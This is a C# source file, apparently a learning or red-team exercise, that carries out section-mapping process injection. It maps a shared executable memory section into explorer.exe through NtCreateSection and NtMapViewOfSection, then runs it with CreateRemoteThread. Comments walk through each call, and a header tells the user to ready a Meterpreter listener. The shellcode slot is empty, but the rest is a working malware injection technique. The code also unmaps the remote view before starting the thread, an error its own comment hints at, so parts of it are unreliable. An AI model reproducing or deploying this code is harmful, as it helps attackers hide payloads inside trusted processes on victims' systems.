using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

/*
 * A .NET standard Console App
 * Make sure to set architecture to x64 and release.
 * After compiling, set up the Meterpreter listener or ready your own listener (if you add your own shellcode) then execute.
 */

namespace DI_Testing
{
    internal class Program
    {
        /*
         * dwDesiredAccess or processAccess - access right to the process object. https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
         * -> Match the access right against the security descriptor of the process you're hijacking. Know which process you have access.
         * bInheritHandle - Whether a process can inherit this handle. Most cases false.
         * dwProcessId - The ID of the process to be open. Use GetCurrentProcess to fetch current process.
         * */
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(
            uint processAccess, 
            bool bInheritHandle, 
            int processId
         );

        /*  
         *  https://ntdoc.m417z.com/ntcreatesection
         *  NtCreateSection - Create a section object, or in other words, 
         *  create a memory address section within a process with access rights.
         *  Using this to add our shellcode to a process where we have write access.
         *  
         *  SectionHandle - Pointer to a variable holding a handle to the section object.
         *  -> The NtCreateSection will use SectionHandle to hold the section object. This is what we'll provide to NtMapViewOfSection to create a shared section between our process and the remote process.
         *  DesiredAccess - Provide the access you want to the object, for example, SECTION_ALL_ACCESS gives R/W/E access
         *  ObjectAttributes - Pointer to structure that specifies object name and other attributes. Not importnat.
         *  MaximumSize - The max size of the section.
         *  SectionPageProtection - Specify the protection placed on each page in the section. i.e. PAGE_READWRITE
         *  AllocationAttributes - bitmask of SEC_XXX flags. Might be needed to specify the access for the mapped views. https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
         *  -> PAGE_EXECUTE_READWRITE
         *  FileHandle - A handle for an open file object. Null probably... its not needed.
         */
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern uint NtCreateSection(
                ref IntPtr SectionHandle,
                uint DesriedACcess,
                IntPtr ObjectAttributes,
                ref long MaximumSize,
                uint SectionPageProtection,
                uint AllocationAttributes,
                IntPtr FileHandle
            );

        /*
         * https://ntdoc.m417z.com/ntmapviewofsection
         *  NtMapViewOfSection - Used to map (link) section between a controlled process and remote process.
         *  -> Maps a view of a section into the virtual address of a subject process.
         *  
         *  SectionHandle - Provide the section handle used during NtCreateSection to map.
         *  ProcessHandle - Provide the process handle of the target process.
         *  BaseAddress - If you know the starting address to allocate, provide it. Else null to let OS do it
         *  ZeroBits - Figure it out. 
         *  CommitSize - The size can be identical to the section size provided to the NtCreateSection.
         *  ViewSize - Can be zero to allow the API to map a view of the section at the beginning 
         *  InheritDisposition - Determine whether the mapped section can be shared with a child process. Not needed
         *  AllocationType - Specifies the type of allocation to be performed for the specified region of page.
         *  -> Might not be needed, for now to set as NULL
         *  PageProtection - Specifies the page protection to be applied to the mapped view
         *  -> We only need execute and read, so PAGE_EXECUTE_READ
         */
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern uint NtMapViewOfSection(
                IntPtr SectionHandle,
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                IntPtr ZeroBits,
                IntPtr CommitSize,
                ref long SectionOffset,
                ref long ViewSize,
                uint InheritDisposition, //boolean or int?
                uint AllocationType,
                uint PageProtection
            );
        // Unmap a view of section from the virtual address of the remote process.
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern uint NtUnmapViewOfSection(
                IntPtr ProcessHandle,
                IntPtr BaseAddress

            );
        //Close the specified handle, sHandle.
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern uint NtClose(
                IntPtr SectionHandle
            );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,
        IntPtr lpThreadId);

        static void Main(string[] args)
        {
            /*
             * SHandle holds the pointer to a variable of the section object.
             * Can safely set the section size to be 4096
             */
            IntPtr SHandle = IntPtr.Zero;
            const int sectionSize = 4096;

            /*
             * Provide the shellcode byte array.
             * 
             */
            byte[] buf = new byte[] { };
            long size = buf.Length;

            /*
             * Open local process. Needed for NtMapViewOfSection ProcessHandle as the handle must be open.
             * localSectionAddress - Address of the current/local process
             */
            long sectionoffset = 0;
            IntPtr localProcess = OpenProcess(0x001F0FFF, false, Process.GetCurrentProcess().Id);
            IntPtr localAddress = IntPtr.Zero;

            //out keyword is used to ensure the SHandle is passed by referenec and allow it to be updated within the API.
            //4 | 2 refers to SECTION_MAP_READ | SECTION_MAP_WRITE. This means it has read/write access
            //0x00000040 is PAGE_EXECUTE_READWRITE  READWRITE
            //0x8000000 is SEC_COMMIT
            //IntPtr.Zero is null for intptr. 
            //Create a section object which SHandle will hold.
            uint createSectionStatus = NtCreateSection(ref SHandle, 4 | 2 | 8, IntPtr.Zero, ref size, 0x00000040, 0x8000000, IntPtr.Zero);
            if (createSectionStatus != 0 || SHandle == IntPtr.Zero)
            {
                Console.WriteLine($"Failed creating section.\nStatus: {createSectionStatus}.\nHandle: {SHandle}");
                return;
            }

            //Map section object with local process
            uint localMapStatus = NtMapViewOfSection(SHandle, localProcess, ref localAddress, IntPtr.Zero, IntPtr.Zero, ref sectionoffset, ref size, 2, 0, 0x04);
            if (localMapStatus != 0 || localAddress == IntPtr.Zero)
            {
                Console.WriteLine($"Failed mapping the view for local section.\nStatus: {localMapStatus}.\nLocal Address: {localAddress}");
                return;
            }

            /*
            * Fetch the target process using getprocessbyname then take the ID and use it for OpenProcess.
           * remoteSectionAddress - Address of the remote process
           * Provide the target process name.
           */
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            IntPtr remoteProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr remoteSectionAddress = IntPtr.Zero;
            //Map section object with remote process
            uint remoteMapStatus = NtMapViewOfSection(SHandle, remoteProcess, ref remoteSectionAddress, IntPtr.Zero, IntPtr.Zero, ref sectionoffset, ref size, 2, 0, 0x20);
            if (remoteMapStatus != 0 || remoteSectionAddress == IntPtr.Zero)
            {
                Console.WriteLine($"Failed mapping the view for remote section.\nStatus: {remoteMapStatus}.\nRemote Address: {remoteSectionAddress}");
                return;
            }

            //MarshalCopy(Source, offset, destination, length) 
            Marshal.Copy(buf, 0, localAddress, buf.Length);
            
            //unmap map view section on local process.
            NtUnmapViewOfSection(localProcess, localAddress);
           //Uhh don't unmap if its explorer... doesn't function well. 
            NtUnmapViewOfSection(remoteProcess, remoteSectionAddress);

            //close
            NtClose(SHandle);

            //execute
            IntPtr hThread = CreateRemoteThread(remoteProcess, IntPtr.Zero, 0, remoteSectionAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
